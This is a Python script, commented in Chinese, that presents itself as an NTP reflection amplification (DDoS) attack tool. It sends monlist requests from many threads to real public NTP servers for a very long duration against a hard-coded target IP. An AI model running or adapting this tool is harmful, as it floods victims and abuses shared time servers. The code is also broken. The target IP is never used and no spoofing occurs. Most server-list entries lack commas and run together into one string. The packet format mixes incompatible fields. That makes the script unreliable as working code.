import socket
import threading
import time
import random
from colorama import init, Fore
import struct

# 初始化 colorama
init()

# 构造优化的 NTP 请求包
def build_ntp_monlist_packet():
    header = struct.pack(
        '!B B B b 4s 4s 4s 4s 4s 4s 4s',
        (0 << 6 | 4 << 3 | 7),  # LI=0, VN=4, Mode=7
        random.randint(1, 16),  # Stratum: 随机值 1-16
        0,                      # Poll: 0
        0,                      # Precision: 0
        b'\x00\x00\x00\x00',   # Root Delay
        b'\x00\x00\x00\x00',   # Root Dispersion
        b'\x00\x00\x00\x00',   # Reference ID
        b'\x00\x00\x00\x00',   # Reference Timestamp
        b'\x00\x00\x00\x00',   # Origin Timestamp
        b'\x00\x00\x00\x00',   # Receive Timestamp
        b'\x00\x00\x00\x00'    # Transmit Timestamp
    )
    monlist = struct.pack(
        '!H B B B B H',
        0, 0, 2, 0, 0, 0  # Monlist 请求
    )
    return header + monlist

# NTP 请求包
NTP_QUERY = build_ntp_monlist_packet()

# 统计成功和失败次数
success_count = 0
failure_count = 0
lock = threading.Lock()

# NTP 反射放大攻击函数
def ntp_amplification(target_ip, ntp_server, duration, stop_event):
    global success_count, failure_count
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)

    end_time = time.time() + duration
    while time.time() < end_time and not stop_event.is_set():
        try:
            sock.sendto(NTP_QUERY, (ntp_server, 123))
            sock.sendto(NTP_QUERY, (ntp_server, 123))
            with lock:
                success_count += 1
        except (socket.timeout, socket.error):
            with lock:
                failure_count += 1
        time.sleep(0.01)
    sock.close()

# 主攻击函数
def start_attack(target_ip, ntp_servers, threads, duration):
    print(Fore.GREEN + "began to attack" + Fore.RESET)
    
    stop_event = threading.Event()
    thread_list = []
    
    for ntp_server in ntp_servers:
        for _ in range(threads // len(ntp_servers)):
            t = threading.Thread(target=ntp_amplification, args=(target_ip, ntp_server, duration, stop_event))
            thread_list.append(t)
            t.start()
    
    for t in thread_list:
        t.join()
    
    print(Fore.RED + "attacks ended" + Fore.RESET)
    return success_count, failure_count

# 主程序
if __name__ == "__main__":
    target_ip = "198.18.130.95"
    ntp_servers = [
        "pool.ntp.org"
        "asia.pool.ntp.org"
        "europe.pool.ntp.org"
        "north-america.pool.ntp.org"
        "202.96.128.86"
        "202.96.134.133"
        "211.136.112.112"
        "211.136.113.113"
        "123.125.1.88"
        "123.125.1.89"
        "time.cloudflare.com"
        "ntp.aliyun.com"
        "ntp.tencent.com"
        "ntp.baidu.com"
        "ntp1.edu.cn"
        "ntp2.edu.cn"
        "ntp3.edu.cn"
        "time.google.com"
        "time.windows.com"
        "ntp.nict.jp"
        "time.windows.com",
    ]
    threads = 20
    duration = 1000000

    print("使用的 NTP 服务器列表：")
    for server in ntp_servers:
        print(f"- {server}")

    success, failure = start_attack(target_ip, ntp_servers, threads, duration)
    
    print(f"成功次数: {success}")
    print(f"失败次数: {failure}")